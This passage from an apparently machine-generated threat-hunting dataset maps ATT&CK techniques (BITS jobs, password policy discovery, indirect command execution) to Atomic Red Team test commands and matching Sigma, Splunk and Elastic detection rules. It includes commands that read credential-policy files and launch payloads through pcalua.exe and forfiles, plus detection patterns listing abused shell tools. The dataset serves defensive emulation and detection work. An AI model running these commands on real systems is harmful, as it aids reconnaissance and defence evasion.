Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:(*\\\\\\\\bitsadmin.exe) AND CommandLine.keyword:(*\\\\ \\\\/transfer\\\\ *)) OR CommandLine.keyword:(*copy\\\\ bitsadmin.exe*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Bitsadmin-Download <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Bitsadmin Download\",\\n    \"description\": \"Detects usage of bitsadmin downloading a file\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.persistence\",\\n      \"attack.t1197\",\\n      \"attack.s0190\"\\n    ],\\n    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\bitsadmin.exe) AND CommandLine.keyword:(*\\\\\\\\ \\\\\\\\/transfer\\\\\\\\ *)) OR CommandLine.keyword:(*copy\\\\\\\\ bitsadmin.exe*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\bitsadmin.exe) AND CommandLine.keyword:(*\\\\\\\\ \\\\\\\\/transfer\\\\\\\\ *)) OR CommandLine.keyword:(*copy\\\\\\\\ bitsadmin.exe*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Bitsadmin Download\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:(*\\\\\\\\bitsadmin.exe) AND CommandLine.keyword:(* \\\\/transfer *)) OR CommandLine.keyword:(*copy bitsadmin.exe*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Image=\"*\\\\\\\\bitsadmin.exe\") (CommandLine=\"* /transfer *\")) OR (CommandLine=\"*copy bitsadmin.exe*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image IN [\"*\\\\\\\\bitsadmin.exe\"] CommandLine IN [\"* /transfer *\"]) OR CommandLine IN [\"*copy bitsadmin.exe*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*.*\\\\bitsadmin\\\\.exe))(?=.*(?:.*.* /transfer .*)))|.*(?:.*.*copy bitsadmin\\\\.exe.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1201/T1201.yaml", "command": "cat /etc/pam.d/common-password\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "cat /etc/security/pwquality.conf\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "cat /etc/login.defs\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "net accounts\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "net accounts /domain\n", "name": null}, {"source": "atomics/T1201/T1201.yaml", "command": "pwpolicy getaccountpolicies", "name": null}, {"source": "data/abilities/discovery/e82f39e2-56f8-4f19-8376-b007f9ac5f8a.yml", "command": {"windows": {"psh": {"command": "net accounts"}}, "darwin": {"sh": {"command": "pwpolicy getaccountpolicies\n"}}, "linux": {"sh": {"command": "cat /etc/pam.d/common-password\n"}}}, "name": "Password Policy Discovery"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_gpo", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_gpo", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ administrator.0DAY> net accounts\nHow long must force users to log off after time expires:? Never\nMinimum password age (days): 1\nMaximum password age (days): 42\nMinimum password length: 7\nKeep the length of the password history: 24\nLockout threshold: Never\nLockout duration (minutes): 30\nLock observation window (minutes): 30\nComputer role: SERVER\nThe command completed successfully.", "name": "Dos"}], "command_list": ["cat /etc/pam.d/common-password\n", "cat /etc/security/pwquality.conf\n", "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "cat /etc/login.defs\n", "net accounts\n", "net accounts /domain\n", "pwpolicy getaccountpolicies", {"windows": {"psh": {"command": "net accounts"}}, "darwin": {"sh": {"command": "pwpolicy getaccountpolicies\n"}}, "linux": {"sh": {"command": "cat /etc/pam.d/common-password\n"}}}, "powershell/situational_awareness/network/powerview/get_gpo", "powershell/situational_awareness/network/powerview/get_gpo", "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ administrator.0DAY> net accounts\nHow long must force users to log off after time expires:? Never\nMinimum password age (days): 1\nMaximum password age (days): 42\nMinimum password length: 7\nKeep the length of the password history: 24\nLockout threshold: Never\nLockout duration (minutes): 30\nLock observation window (minutes): 30\nComputer role: SERVER\nThe command completed successfully."], "technique_id": "T1201", "parsed_datasets": [{"Atomic Red Team Test - Password Policy Discovery": {"display_name": "Password Policy Discovery", "atomic_tests": [{"description": "Lists the password complexity policy to console on Ubuntu Linux.\n", "supported_platforms": ["linux"], "name": "Examine password complexity policy - Ubuntu", "executor": {"command": "cat /etc/pam.d/common-password\n", "name": "bash"}}, {"description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n", "dependencies": [{"description": "System must be CentOS or RHEL v7\n", "get_prereq_command": "echo Please run from CentOS or RHEL v7\n", "prereq_command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"7\" ]; then exit /b 0; else exit /b 1; fi;\n"}], "supported_platforms": ["linux"], "name": "Examine password complexity policy - CentOS/RHEL 7.x", "executor": {"command": "cat /etc/security/pwquality.conf\n", "name": "bash"}}, {"description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n", "dependencies": [{"description": "System must be CentOS or RHEL v6\n", "get_prereq_command": "echo Please run from CentOS or RHEL v6\n", "prereq_command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then exit /b 0; else exit /b 1; fi;\n"}], "supported_platforms": ["linux"], "name": "Examine password complexity policy - CentOS/RHEL 6.x", "executor": {"command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "name": "bash"}}, {"description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n", "supported_platforms": ["linux"], "name": "Examine password expiration policy - All Linux", "executor": {"command": "cat /etc/login.defs\n", "name": "bash"}}, {"description": "Lists the local password policy to console on Windows.\n", "supported_platforms": ["windows"], "name": "Examine local password policy - Windows", "executor": {"elevation_required": false, "command": "net accounts\n", "name": "command_prompt"}}, {"description": "Lists the domain password policy to console on Windows.\n", "supported_platforms": ["windows"], "name": "Examine domain password policy - Windows", "executor": {"elevation_required": false, "command": "net accounts /domain\n", "name": "command_prompt"}}, {"description": "Lists the password policy to console on macOS.\n", "supported_platforms": ["macos"], "name": "Examine password policy - macOS", "executor": {"command": "pwpolicy getaccountpolicies", "name": "bash"}}], "attack_technique": "T1201"}}, {"Mitre Stockpile - Password Policy Discovery": {"platforms": {"windows": {"psh": {"command": "net accounts"}}, "darwin": {"sh": {"command": "pwpolicy getaccountpolicies\n"}}, "linux": {"sh": {"command": "cat /etc/pam.d/common-password\n"}}}, "description": "Password Policy Discovery", "tactic": "discovery", "technique": {"attack_id": "T1201", "name": "Password Policy Discovery"}, "id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a", "name": "Password Policy"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1201", "Empire Module": "powershell/situational_awareness/network/powerview/get_gpo", "Technique": "Password Policy Discovery", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_gpo\":  [\"T1201\"],"}}], "queries": [{"query": "Sysmon| where EventID == 11and (process_command_line contains \"net accounts\"or process_command_line contains \"net accounts \\\\/domain\")", "product": "Azure Sentinel", "name": "Password Policy Discovery"}, {"query": "Yml\ntitle: windows system password policies found\ndescription: windows server 2016\nreferences:\ntags: T1016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net accounts # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: C: \\ Windows \\ system32 \\ net1 accounts # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0condition: selection1 and selection2\nlevel: low", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1202/T1202.yaml", "command": "pcalua.exe -a calc.exe\npcalua.exe -a #{payload_path}\npcalua.exe -a #{payload_cpl_path}\n", "name": null}, {"source": "atomics/T1202/T1202.yaml", "command": "pcalua.exe -a calc.exe\npcalua.exe -a c:\\temp\\payload.dll\npcalua.exe -a #{payload_cpl_path}\n", "name": null}, {"source": "atomics/T1202/T1202.yaml", "command": "pcalua.exe -a #{process}\npcalua.exe -a #{payload_path}\npcalua.exe -a C:\\Windows\\system32\\javacpl.cpl -c Java\n", "name": null}, {"source": "atomics/T1202/T1202.yaml", "command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe\nforfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\folder\\normal.dll:evil.exe\"\n", "name": null}, {"source": "SysmonHunter - Indirect Command Execution", "command": "pcalua.exe", "name": null}], "command_list": ["pcalua.exe -a calc.exe\npcalua.exe -a #{payload_path}\npcalua.exe -a #{payload_cpl_path}\n", "pcalua.exe -a calc.exe\npcalua.exe -a c:\\temp\\payload.dll\npcalua.exe -a #{payload_cpl_path}\n", "pcalua.exe -a #{process}\npcalua.exe -a #{payload_path}\npcalua.exe -a C:\\Windows\\system32\\javacpl.cpl -c Java\n", "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe\nforfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\folder\\normal.dll:evil.exe\"\n", "pcalua.exe"], "technique_id": "T1202", "parsed_datasets": [{"Atomic Red Team Test - Indirect Command Execution": {"display_name": "Indirect Command Execution", "atomic_tests": [{"description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\n", "supported_platforms": ["windows"], "name": "Indirect Command Execution - pcalua.exe", "input_arguments": {"process": {"default": "calc.exe", "type": "string", "description": "Process to execute"}, "payload_path": {"default": "c:\\temp\\payload.dll", "type": "path", "description": "Path to payload"}, "payload_cpl_path": {"default": "C:\\Windows\\system32\\javacpl.cpl -c Java", "type": "path", "description": "Path to payload"}}, "executor": {"command": "pcalua.exe -a #{process}\npcalua.exe -a #{payload_path}\npcalua.exe -a #{payload_cpl_path}\n", "name": "command_prompt"}}, {"description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n\n[Reference](https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Forfiles.md)\n\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\n", "supported_platforms": ["windows"], "name": "Indirect Command Execution - forfiles.exe", "input_arguments": {"process": {"default": "calc.exe", "type": "string", "description": "Process to execute"}}, "executor": {"command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c #{process}\nforfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\folder\\normal.dll:evil.exe\"\n", "name": "command_prompt"}}], "attack_technique": "T1202"}}, {"SysmonHunter - T1202": {"phase": "Execution", "query": [{"process": {"any": {"pattern": "pcalua.exe"}}, "type": "process"}], "description": null, "name": "Indirect Command Execution", "level": "medium"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_parent_command_line contains \"pcalua.exe\"or process_path contains \"pcalua.exe\"or process_path contains \"bash.exe\"or process_path contains \"forfiles.exe\")", "product": "Azure Sentinel", "name": "Indirect Command Execution"}, {"query": "title: Indirect Command Execution\nid: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\ndescription: Detect indirect command execution via Program Compatibility Assistant pcalua.exe or forfiles.exe\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/884a7ccd-7305-4130-82d0-d4f90bc118b6.html\ndate: 2019/10/24\nmodified: 2019/11/11\ntags:\n    - attack.defense_evasion\n    - attack.t1202\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\pcalua.exe'\n            - '\\forfiles.exe'\n    condition: selection\nfalsepositives:\n    - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers as opposed to commonly seen artifacts\n    - Legit usage of scripts\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Indirect Command Execution\nid: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\ndescription: Detect indirect command execution via Program Compatibility Assistant pcalua.exe or forfiles.exe\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1202/T1202.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/884a7ccd-7305-4130-82d0-d4f90bc118b6.html\ndate: 2019/10/24\nmodified: 2019/11/11\ntags:\n    - attack.defense_evasion\n    - attack.t1202\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\pcalua.exe'\n            - '\\forfiles.exe'\n    condition: selection\nfalsepositives:\n    - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers as opposed to commonly seen artifacts\n    - Legit usage of scripts\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "ParentImage.keyword:(*\\\\\\\\pcalua.exe OR *\\\\\\\\forfiles.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Indirect-Command-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Indirect Command Execution\",\\n    \"description\": \"Detect indirect command execution via Program Compatibility Assistant pcalua.exe or forfiles.exe\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1202\"\\n    ],\\n    \"query\": \"ParentImage.keyword:(*\\\\\\\\\\\\\\\\pcalua.exe OR *\\\\\\\\\\\\\\\\forfiles.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"ParentImage.keyword:(*\\\\\\\\\\\\\\\\pcalua.exe OR *\\\\\\\\\\\\\\\\forfiles.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Indirect Command Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "ParentImage.keyword:(*\\\\\\\\pcalua.exe *\\\\\\\\forfiles.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\pcalua.exe\" OR ParentImage=\"*\\\\\\\\forfiles.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage IN [\"*\\\\\\\\pcalua.exe\", \"*\\\\\\\\forfiles.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\pcalua\\\\.exe|.*.*\\\\forfiles\\\\.exe)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Microsoft Office Product Spawning Windows Shell\nid: 438025f9-5856-4663-83f7-52f878a70a50\nstatus: experimental\ndescription: Detects a Windows command line executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1059\n    - attack.t1202\n    - car.2013-02-003\n    - car.2014-04-003\nauthor: Michael Haag, Florian Roth, Markus Neis\ndate: 2018/04/06\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\WINWORD.EXE'\n            - '*\\EXCEL.EXE'\n            - '*\\POWERPNT.exe'\n            - '*\\MSPUB.exe'\n            - '*\\VISIO.exe'\n            - '*\\OUTLOOK.EXE'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\powershell.exe'\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\scrcons.exe'\n            - '*\\schtasks.exe'\n            - '*\\regsvr32.exe'\n            - '*\\hh.exe'\n            - '*\\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '*\\mshta.exe'\n            - '*\\rundll32.exe'\n            - '*\\msiexec.exe'\n            - '*\\forfiles.exe'\n            - '*\\scriptrunner.exe'\n            - '*\\mftrace.exe'\n            - '*\\AppVLP.exe'\n            - '*\\svchost.exe'  # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Microsoft Office Product Spawning Windows Shell\nid: 438025f9-5856-4663-83f7-52f878a70a50\nstatus: experimental\ndescription: Detects a Windows command line executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio.\nreferences:\n    - https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1059\n    - attack.t1202\n    - car.2013-02-003\n    - car.2014-04-003\nauthor: Michael Haag, Florian Roth, Markus Neis\ndate: 2018/04/06\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\WINWORD.EXE'\n            - '*\\EXCEL.EXE'\n            - '*\\POWERPNT.exe'\n            - '*\\MSPUB.exe'\n            - '*\\VISIO.exe'\n            - '*\\OUTLOOK.EXE'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\powershell.exe'\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\scrcons.exe'\n            - '*\\schtasks.exe'\n            - '*\\regsvr32.exe'\n            - '*\\hh.exe'\n            - '*\\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '*\\mshta.exe'\n            - '*\\rundll32.exe'\n            - '*\\msiexec.exe'\n            - '*\\forfiles.exe'\n            - '*\\scriptrunner.exe'\n            - '*\\mftrace.exe'\n            - '*\\AppVLP.exe'\n            - '*\\svchost.exe'  # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:(*\\\\\\\\WINWORD.EXE OR *\\\\\\\\EXCEL.EXE OR *\\\\\\\\POWERPNT.exe OR *\\\\\\\\MSPUB.exe OR *\\\\\\\\VISIO.exe OR *\\\\\\\\OUTLOOK.EXE) AND Image.keyword:(*\\\\\\\\cmd.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\wscript.exe OR *\\\\\\\\cscript.exe OR *\\\\\\\\sh.exe OR *\\\\\\\\bash.exe OR *\\\\\\\\scrcons.exe OR *\\\\\\\\schtasks.exe OR *\\\\\\\\regsvr32.exe OR *\\\\\\\\hh.exe OR *\\\\\\\\wmic.exe OR *\\\\\\\\mshta.exe OR *\\\\\\\\rundll32.exe OR *\\\\\\\\msiexec.exe OR *\\\\\\\\forfiles.exe OR *\\\\\\\\scriptrunner.exe OR *\\\\\\\\mftrace.exe OR *\\\\\\\\AppVLP.exe OR *\\\\\\\\svchost.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Microsoft-Office-Product-Spawning-Windows-Shell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Microsoft Office Product Spawning Windows Shell\",\\n    \"description\": \"Detects a Windows command line executable started from Microsoft Word, Excel, Powerpoint, Publisher and Visio.\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1059\",\\n      \"attack.t1202\",\\n      \"car.2013-02-003\",\\n      \"car.2014-04-003\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\WINWORD.EXE OR *\\\\\\\\\\\\\\\\EXCEL.EXE OR *\\\\\\\\\\\\\\\\POWERPNT.exe OR *\\\\\\\\\\\\\\\\MSPUB.exe OR *\\\\\\\\\\\\\\\\VISIO.exe OR *\\\\\\\\\\\\\\\\OUTLOOK.EXE) AND Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\sh.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\scrcons.exe OR *\\\\\\\\\\\\\\\\schtasks.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\hh.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\msiexec.exe OR *\\\\\\\\\\\\\\\\forfiles.exe OR *\\\\\\\\\\\\\\\\scriptrunner.exe OR *\\\\\\\\\\\\\\\\mftrace.exe OR *\\\\\\\\\\\\\\\\AppVLP.exe OR *\\\\\\\\\\\\\\\\svchost.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\WINWORD.EXE OR *\\\\\\\\\\\\\\\\EXCEL.EXE OR *\\\\\\\\\\\\\\\\POWERPNT.exe OR *\\\\\\\\\\\\\\\\MSPUB.exe OR *\\\\\\\\\\\\\\\\VISIO.exe OR *\\\\\\\\\\\\\\\\OUTLOOK.EXE) AND Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\sh.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\scrcons.exe OR *\\\\\\\\\\\\\\\\schtasks.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\hh.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\msiexec.exe OR *\\\\\\\\\\\\\\\\forfiles.exe OR *\\\\\\\\\\\\\\\\scriptrunner.exe OR *\\\\\\\\\\\\\\\\mftrace.exe OR *\\\\\\\\\\\\\\\\AppVLP.exe OR *\\\\\\\\\\\\\\\\svchost.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Microsoft Office Product Spawning Windows Shell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:(*\\\\\\\\WINWORD.EXE *\\\\\\\\EXCEL.EXE *\\\\\\\\POWERPNT.exe *\\\\\\\\MSPUB.exe *\\\\\\\\VISIO.exe *\\\\\\\\OUTLOOK.EXE) AND Image.keyword:(*\\\\\\\\cmd.exe *\\\\\\\\powershell.exe *\\\\\\\\wscript.exe *\\\\\\\\cscript.exe *\\\\\\\\sh.exe *\\\\\\\\bash.exe *\\\\\\\\scrcons.exe *\\\\\\\\schtasks.exe *\\\\\\\\regsvr32.exe *\\\\\\\\hh.exe *\\\\\\\\wmic.exe *\\\\\\\\mshta.exe *\\\\\\\\rundll32.exe *\\\\\\\\msiexec.exe *\\\\\\\\forfiles.exe *\\\\\\\\scriptrunner.exe *\\\\\\\\mftrace.exe *\\\\\\\\AppVLP.exe 